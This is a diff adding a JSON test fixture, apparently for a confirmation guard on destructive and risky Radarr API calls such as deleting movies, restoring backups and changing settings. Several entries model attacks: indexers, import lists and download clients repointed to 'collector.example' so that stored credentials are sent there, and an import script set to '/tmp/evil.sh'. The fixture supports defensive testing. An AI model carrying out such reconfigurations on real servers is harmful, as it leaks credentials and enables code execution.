@@ -1,0 +1,396 @@
+{
+  "DELETE /api/v3/blocklist/{id}": {
+    "confirmLiteral": "61",
+    "resolved": "DELETE /api/v3/blocklist/{id}",
+    "targets": [],
+    "text": "Radarr DELETE /api/v3/blocklist/61"
+  },
+  "DELETE /api/v3/downloadclient/{id}": {
+    "confirmLiteral": "qBit",
+    "resolved": "DELETE /api/v3/downloadclient/{id}",
+    "targets": [
+      {
+        "id": "6",
+        "kind": "downloadclient",
+        "name": "downloadclient qBit (QBittorrent) → http://qbittorrent.lan:8080"
+      }
+    ],
+    "text": "Radarr DELETE /api/v3/downloadclient/6 on downloadclient qBit (QBittorrent) → http://qbittorrent.lan:8080"
+  },
+  "DELETE /api/v3/movie/editor": {
+    "confirmLiteral": "1 movie",
+    "resolved": "DELETE /api/v3/movie/editor",
+    "targets": [
+      {
+        "id": "2",
+        "kind": "movie",
+        "name": "Arrival (2016) at /movies/Arrival (2016)"
+      }
+    ],
+    "text": "Radarr DELETE /api/v3/movie/editor on Arrival (2016) at /movies/Arrival (2016) {\"movieIds\":[2],\"deleteFiles\":false}"
+  },
+  "DELETE /api/v3/movie/editor#delete-files": {
+    "confirmLiteral": "2 movies",
+    "resolved": "DELETE /api/v3/movie/editor#delete-files",
+    "targets": [
+      {
+        "id": "1",
+        "kind": "movie",
+        "name": "Inception (2010) at /movies/Inception (2010)"
+      },
+      {
+        "id": "2",
+        "kind": "movie",
+        "name": "Arrival (2016) at /movies/Arrival (2016)"
+      }
+    ],
+    "text": "Radarr DELETE /api/v3/movie/editor on Inception (2010) at /movies/Inception (2010); Arrival (2016) at /movies/Arrival (2016) {\"movieIds\":[1,2],\"deleteFiles\":true} (also deletes the files from disk)"
+  },
+  "DELETE /api/v3/movie/{id}": {
+    "confirmLiteral": "Inception",
+    "resolved": "DELETE /api/v3/movie/{id}",
+    "targets": [
+      {
+        "id": "1",
+        "kind": "movie",
+        "name": "Inception (2010) at /movies/Inception (2010)"
+      }
+    ],
+    "text": "Radarr DELETE /api/v3/movie/1 on Inception (2010) at /movies/Inception (2010)"
+  },
+  "DELETE /api/v3/movie/{id}#delete-files": {
+    "confirmLiteral": "Inception",
+    "resolved": "DELETE /api/v3/movie/{id}#delete-files",
+    "targets": [
+      {
+        "id": "1",
+        "kind": "movie",
+        "name": "Inception (2010) at /movies/Inception (2010)"
+      }
+    ],
+    "text": "Radarr DELETE /api/v3/movie/1?deleteFiles=true on Inception (2010) at /movies/Inception (2010) (also deletes the files from disk)"
+  },
+  "DELETE /api/v3/moviefile/{id}": {
+    "confirmLiteral": "Inception (2010).mkv",
+    "resolved": "DELETE /api/v3/moviefile/{id}",
+    "targets": [],
+    "text": "Radarr DELETE /api/v3/moviefile/13"
+  },
+  "DELETE /api/v3/queue/bulk": {
+    "confirmLiteral": "1 item",
+    "resolved": "DELETE /api/v3/queue/bulk",
+    "targets": [],
+    "text": "Radarr DELETE /api/v3/queue/bulk {\"ids\":[41]}"
+  },
+  "DELETE /api/v3/queue/{id}": {
+    "confirmLiteral": "Inception.2010.1080p.BluRay",
+    "resolved": "DELETE /api/v3/queue/{id}",
+    "targets": [],
+    "text": "Radarr DELETE /api/v3/queue/41?removeFromClient=true"
+  },
+  "DELETE /api/v3/system/backup/{id}": {
+    "confirmLiteral": "radarr_backup_v6.4.4.10685_2026.10.14_10.00.00.zip",
+    "resolved": "DELETE /api/v3/system/backup/{id}",
+    "targets": [],
+    "text": "Radarr DELETE /api/v3/system/backup/21"
+  },
+  "DELETE /api/v3/tag/{id}": {
+    "confirmLiteral": "kids",
+    "resolved": "DELETE /api/v3/tag/{id}",
+    "targets": [],
+    "text": "Radarr DELETE /api/v3/tag/3"
+  },
+  "POST /api/v3/command#heavy": {
+    "confirmLiteral": "RenameFiles",
+    "resolved": "POST /api/v3/command#heavy",
+    "targets": [],
+    "text": "Radarr POST /api/v3/command {\"name\":\"RenameFiles\",\"movieId\":1,\"files\":[13]} (renames, moves or deletes files, clears data, or changes the application)"
+  },
+  "POST /api/v3/downloadclient": {
+    "confirmLiteral": "SAB",
+    "resolved": "POST /api/v3/downloadclient",
+    "targets": [
+      {
+        "id": "new",
+        "kind": "downloadclient",
+        "name": "downloadclient SAB (Sabnzbd) → http://sab.lan:8085"
+      }
+    ],
+    "text": "Radarr POST /api/v3/downloadclient on downloadclient SAB (Sabnzbd) → http://sab.lan:8085 {\"name\":\"SAB\",\"implementation\":\"Sabnzbd\",\"enable\":true,\"fields\":\"[REDACTED]\"}"
+  },
+  "POST /api/v3/downloadclient/action/{name}#stored": {
+    "confirmLiteral": "qBit",
+    "resolved": "POST /api/v3/downloadclient/action/{name}#stored",
+    "targets": [
+      {
+        "id": "6",
+        "kind": "downloadclient",
+        "name": "downloadclient qBit (Any) → https://collector.example:443"
+      }
+    ],
+    "text": "Radarr POST /api/v3/downloadclient/action/getCategories on downloadclient qBit (Any) → https://collector.example:443 {\"id\":6,\"name\":\"qBit\",\"implementation\":\"Any\",\"enable\":true,\"fields\":\"[REDACTED]\"} (sends the stored credentials to the host in the body)"
+  },
+  "POST /api/v3/downloadclient/test#stored": {
+    "confirmLiteral": "qBit",
+    "resolved": "POST /api/v3/downloadclient/test#stored",
+    "targets": [
+      {
+        "id": "6",
+        "kind": "downloadclient",
+        "name": "downloadclient qBit (Any) → https://collector.example:443"
+      }
+    ],
+    "text": "Radarr POST /api/v3/downloadclient/test on downloadclient qBit (Any) → https://collector.example:443 {\"id\":6,\"name\":\"qBit\",\"implementation\":\"Any\",\"enable\":true,\"fields\":\"[REDACTED]\"} (sends the stored credentials to the host in the body)"
+  },
+  "POST /api/v3/importlist": {
+    "confirmLiteral": "My list",
+    "resolved": "POST /api/v3/importlist",
+    "targets": [
+      {
+        "id": "new",
+        "kind": "importlist",
+        "name": "importlist My list (RadarrImport) → http://other-radarr:7878"
+      }
+    ],
+    "text": "Radarr POST /api/v3/importlist on importlist My list (RadarrImport) → http://other-radarr:7878 {\"name\":\"My list\",\"implementation\":\"RadarrImport\",\"enable\":true,\"fields\":\"[REDACTED]\"}"
+  },
+  "POST /api/v3/importlist/action/{name}#stored": {
+    "confirmLiteral": "Radarr 4K",
+    "resolved": "POST /api/v3/importlist/action/{name}#stored",
+    "targets": [
+      {
+        "id": "8",
+        "kind": "importlist",
+        "name": "importlist Radarr 4K (Any) → https://collector.example:443"
+      }
+    ],
+    "text": "Radarr POST /api/v3/importlist/action/getCategories on importlist Radarr 4K (Any) → https://collector.example:443 {\"id\":8,\"name\":\"Radarr 4K\",\"implementation\":\"Any\",\"enable\":true,\"fields\":\"[REDACTED]\"} (sends the stored credentials to the host in the body)"
+  },
+  "POST /api/v3/importlist/test#stored": {
+    "confirmLiteral": "Radarr 4K",
+    "resolved": "POST /api/v3/importlist/test#stored",
+    "targets": [
+      {
+        "id": "8",
+        "kind": "importlist",
+        "name": "importlist Radarr 4K (Any) → https://collector.example:443"
+      }
+    ],
+    "text": "Radarr POST /api/v3/importlist/test on importlist Radarr 4K (Any) → https://collector.example:443 {\"id\":8,\"name\":\"Radarr 4K\",\"implementation\":\"Any\",\"enable\":true,\"fields\":\"[REDACTED]\"} (sends the stored credentials to the host in the body)"
+  },
+  "POST /api/v3/indexer": {
+    "confirmLiteral": "Geek2",
+    "resolved": "POST /api/v3/indexer",
+    "targets": [
+      {
+        "id": "new",
+        "kind": "indexer",
+        "name": "indexer Geek2 (Newznab) → https://api.example.org"
+      }
+    ],
+    "text": "Radarr POST /api/v3/indexer on indexer Geek2 (Newznab) → https://api.example.org {\"name\":\"Geek2\",\"implementation\":\"Newznab\",\"enable\":true,\"fields\":\"[REDACTED]\"}"
+  },
+  "POST /api/v3/indexer/action/{name}#stored": {
+    "confirmLiteral": "NZBgeek",
+    "resolved": "POST /api/v3/indexer/action/{name}#stored",
+    "targets": [
+      {
+        "id": "7",
+        "kind": "indexer",
+        "name": "indexer NZBgeek (Any) → https://collector.example:443"
+      }
+    ],
+    "text": "Radarr POST /api/v3/indexer/action/getCategories on indexer NZBgeek (Any) → https://collector.example:443 {\"id\":7,\"name\":\"NZBgeek\",\"implementation\":\"Any\",\"enable\":true,\"fields\":\"[REDACTED]\"} (sends the stored credentials to the host in the body)"
+  },
+  "POST /api/v3/indexer/test#stored": {
+    "confirmLiteral": "NZBgeek",
+    "resolved": "POST /api/v3/indexer/test#stored",
+    "targets": [
+      {
+        "id": "7",
+        "kind": "indexer",
+        "name": "indexer NZBgeek (Any) → https://collector.example:443"
+      }
+    ],
+    "text": "Radarr POST /api/v3/indexer/test on indexer NZBgeek (Any) → https://collector.example:443 {\"id\":7,\"name\":\"NZBgeek\",\"implementation\":\"Any\",\"enable\":true,\"fields\":\"[REDACTED]\"} (sends the stored credentials to the host in the body)"
+  },
+  "POST /api/v3/notification": {
+    "confirmLiteral": "Hook",
+    "resolved": "POST /api/v3/notification",
+    "targets": [
+      {
+        "id": "new",
+        "kind": "notification",
+        "name": "notification Hook (Webhook) → https://hooks.example.com"
+      }
+    ],
+    "text": "Radarr POST /api/v3/notification on notification Hook (Webhook) → https://hooks.example.com {\"name\":\"Hook\",\"implementation\":\"Webhook\",\"enable\":true,\"fields\":\"[REDACTED]\"}"
+  },
+  "POST /api/v3/notification/action/{name}": {
+    "confirmLiteral": "Home Radarr",
+    "resolved": "POST /api/v3/notification/action/{name}",
+    "targets": [
+      {
+        "id": "new",
+        "kind": "notification",
+        "name": "notification New (Gotify) → https://gotify.example"
+      }
+    ],
+    "text": "Radarr POST /api/v3/notification/action/getDevices on notification New (Gotify) → https://gotify.example {\"name\":\"New\",\"implementation\":\"Gotify\",\"enable\":true,\"fields\":\"[REDACTED]\"}"
+  },
+  "POST /api/v3/notification/test": {
+    "confirmLiteral": "Discord",
+    "resolved": "POST /api/v3/notification/test",
+    "targets": [
+      {
+        "id": "9",
+        "kind": "notification",
+        "name": "notification Discord (Discord) → https://collector.example"
+      }
+    ],
+    "text": "Radarr POST /api/v3/notification/test on notification Discord (Discord) → https://collector.example {\"id\":9,\"name\":\"Discord\",\"implementation\":\"Discord\",\"enable\":true,\"fields\":\"[REDACTED]\"}"
+  },
+  "POST /api/v3/notification/testall": {
+    "confirmLiteral": "Home Radarr",
+    "resolved": "POST /api/v3/notification/testall",
+    "targets": [],
+    "text": "Radarr POST /api/v3/notification/testall"
+  },
+  "POST /api/v3/release/push": {
+    "confirmLiteral": "Home Radarr",
+    "resolved": "POST /api/v3/release/push",
+    "targets": [
+      {
+        "id": "push",
+        "kind": "release",
+        "name": "Some.Movie.2020.1080p from https://tracker.example"
+      }
+    ],
+    "text": "Radarr POST /api/v3/release/push on Some.Movie.2020.1080p from https://tracker.example {\"title\":\"Some.Movie.2020.1080p\",\"downloadUrl\":\"[REDACTED]\",\"protocol\":\"torrent\"}"
+  },
+  "POST /api/v3/rootfolder": {
+    "confirmLiteral": "/",
+    "resolved": "POST /api/v3/rootfolder",
+    "targets": [
+      {
+        "id": "path",
+        "kind": "folder",
+        "name": "root folder /"
+      }
+    ],
+    "text": "Radarr POST /api/v3/rootfolder on root folder / {\"path\":\"/\"}"
+  },
+  "POST /api/v3/system/backup/restore/{id}": {
+    "confirmLiteral": "radarr_backup_v6.4.4.10685_2026.10.14_10.00.00.zip",
+    "resolved": "POST /api/v3/system/backup/restore/{id}",
+    "targets": [],
+    "text": "Radarr POST /api/v3/system/backup/restore/21 (replaces the database and settings, then restarts)"
+  },
+  "POST /api/v3/system/restart": {
+    "confirmLiteral": "Home Radarr",
+    "resolved": "POST /api/v3/system/restart",
+    "targets": [],
+    "text": "Radarr POST /api/v3/system/restart"
+  },
+  "POST /api/v3/system/shutdown": {
+    "confirmLiteral": "Home Radarr",
+    "resolved": "POST /api/v3/system/shutdown",
+    "targets": [],
+    "text": "Radarr POST /api/v3/system/shutdown"
+  },
+  "PUT /api/v3/config/host/{id}": {
+    "confirmLiteral": "Home Radarr",
+    "resolved": "PUT /api/v3/config/host/{id}",
+    "targets": [],
+    "text": "Radarr PUT /api/v3/config/host/1 {\"id\":1,\"bindAddress\":\"*\",\"urlBase\":\"/radarr\"} (sign-in, bind address, port, URL base, proxy and update script)"
+  },
+  "PUT /api/v3/config/mediamanagement/{id}": {
+    "confirmLiteral": "Home Radarr",
+    "resolved": "PUT /api/v3/config/mediamanagement/{id}",
+    "targets": [
+      {
+        "id": "scriptImportPath",
+        "kind": "script",
+        "name": "import script on: /tmp/evil.sh"
+      }
+    ],
+    "text": "Radarr PUT /api/v3/config/mediamanagement/1 on import script on: /tmp/evil.sh {\"id\":1,\"useScriptImport\":true,\"scriptImportPath\":\"/tmp/evil.sh\"} (import script, file permissions and owner, recycle bin)"
+  },
+  "PUT /api/v3/downloadclient/{id}": {
+    "confirmLiteral": "qBit",
+    "resolved": "PUT /api/v3/downloadclient/{id}",
+    "targets": [
+      {
+        "id": "6",
+        "kind": "downloadclient",
+        "name": "downloadclient Renamed (QBittorrent) → https://collector.example:443"
+      }
+    ],
+    "text": "Radarr PUT /api/v3/downloadclient/6 on downloadclient Renamed (QBittorrent) → https://collector.example:443 {\"id\":6,\"name\":\"Renamed\",\"implementation\":\"QBittorrent\",\"enable\":true,\"fields\":\"[REDACTED]\"}"
+  },
+  "PUT /api/v3/importlist/{id}": {
+    "confirmLiteral": "Radarr 4K",
+    "resolved": "PUT /api/v3/importlist/{id}",
+    "targets": [
+      {
+        "id": "8",
+        "kind": "importlist",
+        "name": "importlist Radarr 4K (RadarrImport) → http://radarr-4k.lan:7878"
+      }
+    ],
+    "text": "Radarr PUT /api/v3/importlist/8 on importlist Radarr 4K (RadarrImport) → http://radarr-4k.lan:7878 {\"id\":8,\"name\":\"Radarr 4K\",\"implementation\":\"RadarrImport\",\"enable\":true,\"fields\":\"[REDACTED]\"}"
+  },
+  "PUT /api/v3/indexer/{id}": {
+    "confirmLiteral": "NZBgeek",
+    "resolved": "PUT /api/v3/indexer/{id}",
+    "targets": [
+      {
+        "id": "7",
+        "kind": "indexer",
+        "name": "indexer NZBgeek (Newznab) → https://collector.example"
+      }
+    ],
+    "text": "Radarr PUT /api/v3/indexer/7 on indexer NZBgeek (Newznab) → https://collector.example {\"id\":7,\"name\":\"NZBgeek\",\"implementation\":\"Newznab\",\"enable\":true,\"fields\":\"[REDACTED]\"}"
+  },
+  "PUT /api/v3/movie/editor": {
+    "confirmLiteral": "2 movies",
+    "resolved": "PUT /api/v3/movie/editor",
+    "targets": [
+      {
+        "id": "1",
+        "kind": "movie",
+        "name": "Inception (2010) at /movies/Inception (2010)"
+      },
+      {
+        "id": "2",
+        "kind": "movie",
+        "name": "Arrival (2016) at /movies/Arrival (2016)"
+      }
+    ],
+    "text": "Radarr PUT /api/v3/movie/editor on Inception (2010) at /movies/Inception (2010); Arrival (2016) at /movies/Arrival (2016) {\"movieIds\":[1,2],\"monitored\":false}"
+  },
+  "PUT /api/v3/movie/{id}#move-files": {
+    "confirmLiteral": "Arrival",
+    "resolved": "PUT /api/v3/movie/{id}#move-files",
+    "targets": [
+      {
+        "id": "2",
+        "kind": "movie",
+        "name": "Arrival (2016) at /movies/Arrival (2016) → /elsewhere/Arrival (2016)"
+      }
+    ],
+    "text": "Radarr PUT /api/v3/movie/2?moveFiles=true on Arrival (2016) at /movies/Arrival (2016) → /elsewhere/Arrival (2016) {\"id\":2,\"title\":\"Not Arrival\",\"path\":\"/elsewhere/Arrival (2016)\"} (moves the files on disk)"
+  },
+  "PUT /api/v3/notification/{id}": {
+    "confirmLiteral": "Discord",
+    "resolved": "PUT /api/v3/notification/{id}",
+    "targets": [
+      {
+        "id": "9",
+        "kind": "notification",
+        "name": "notification Discord (Discord) → https://discord.com"
+      }
+    ],
+    "text": "Radarr PUT /api/v3/notification/9 on notification Discord (Discord) → https://discord.com {\"id\":9,\"name\":\"Discord\",\"implementation\":\"Discord\",\"enable\":true,\"fields\":\"[REDACTED]\"}"
+  }
+}
